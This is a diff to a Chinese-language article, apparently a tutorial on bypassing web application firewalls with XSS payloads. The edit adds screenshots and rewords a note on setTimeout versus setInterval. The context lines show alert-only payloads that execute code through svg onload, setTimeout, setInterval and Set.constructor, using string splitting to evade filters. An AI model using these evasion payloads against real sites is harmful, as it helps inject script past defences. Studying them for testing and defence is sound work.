@@ -130,6 +130,8 @@ setTimeout()函数也是没问题的，毕竟也能执行代码。
 - - -
 `setTimeout`比eval略眼熟，也是比较常见的。
 
+![19](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ycyd6jedj30no0adt90.jpg)
+
 waf拦截
 ```html
 <svg/onload=setTimeout`alert(1)`>
@@ -142,11 +144,16 @@ waf拦截
 ```
 ![18](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xy76ggesj30uj0813z5.jpg)
 
-`setInterval`也能执行代码，常见的拼接。
+与`setInterval`不同，对于`setTimeout()`只执行code一次。
+
+![20](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yczzsa24j30no0exwf8.jpg)
 
 `<svg/onload=setInterval('al'%2b'ert(1)')>`
 
-`Set.constructor`不是很常见，但是也能执行代码。
+`Set.constructor`不是很常见，但是也能执行代码
+
+
+
 `<svg/onload=Set.constructor('ale'%2B'rt(13)')()>`
 
 其他：
